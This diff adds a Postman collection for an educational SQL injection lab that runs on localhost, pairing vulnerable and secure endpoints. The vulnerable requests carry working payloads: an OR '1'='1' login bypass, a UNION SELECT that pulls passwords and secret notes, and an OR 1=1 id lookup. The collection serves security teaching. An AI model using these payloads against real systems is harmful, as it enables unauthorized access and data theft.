@@ -1,0 +1,85 @@
+{
+  "info": {
+    "name": "SQLi-Lab",
+    "description": "Educational SQL injection lab collection. Run against a local SQLi-Lab instance.",
+    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+  },
+  "variable": [
+    {
+      "key": "baseUrl",
+      "value": "http://localhost:5000"
+    }
+  ],
+  "item": [
+    {
+      "name": "Health",
+      "request": {
+        "method": "GET",
+        "url": "{{baseUrl}}/api/health"
+      }
+    },
+    {
+      "name": "List Labs",
+      "request": {
+        "method": "GET",
+        "url": "{{baseUrl}}/api/labs"
+      }
+    },
+    {
+      "name": "Auth Bypass - Vulnerable",
+      "request": {
+        "method": "POST",
+        "header": [
+          { "key": "Content-Type", "value": "application/json" }
+        ],
+        "body": {
+          "mode": "raw",
+          "raw": "{\n  \"username\": \"admin' OR '1'='1' -- \",\n  \"password\": \"anything\"\n}"
+        },
+        "url": "{{baseUrl}}/api/labs/auth-bypass/vulnerable"
+      }
+    },
+    {
+      "name": "Auth Bypass - Secure",
+      "request": {
+        "method": "POST",
+        "header": [
+          { "key": "Content-Type", "value": "application/json" }
+        ],
+        "body": {
+          "mode": "raw",
+          "raw": "{\n  \"username\": \"admin\",\n  \"password\": \"admin123\"\n}"
+        },
+        "url": "{{baseUrl}}/api/labs/auth-bypass/secure"
+      }
+    },
+    {
+      "name": "Search - Vulnerable (UNION payload)",
+      "request": {
+        "method": "GET",
+        "url": "{{baseUrl}}/api/labs/search/vulnerable?q=' UNION SELECT u.id, u.username, u.password, u.role, p.email, p.secret_note FROM users u JOIN profiles p ON u.id = p.user_id -- "
+      }
+    },
+    {
+      "name": "Search - Secure",
+      "request": {
+        "method": "GET",
+        "url": "{{baseUrl}}/api/labs/search/secure?q=alice"
+      }
+    },
+    {
+      "name": "Profile Lookup - Vulnerable",
+      "request": {
+        "method": "GET",
+        "url": "{{baseUrl}}/api/labs/profile/vulnerable?id=1 OR 1=1"
+      }
+    },
+    {
+      "name": "Profile Lookup - Secure",
+      "request": {
+        "method": "GET",
+        "url": "{{baseUrl}}/api/labs/profile/secure?id=1"
+      }
+    }
+  ]
+}
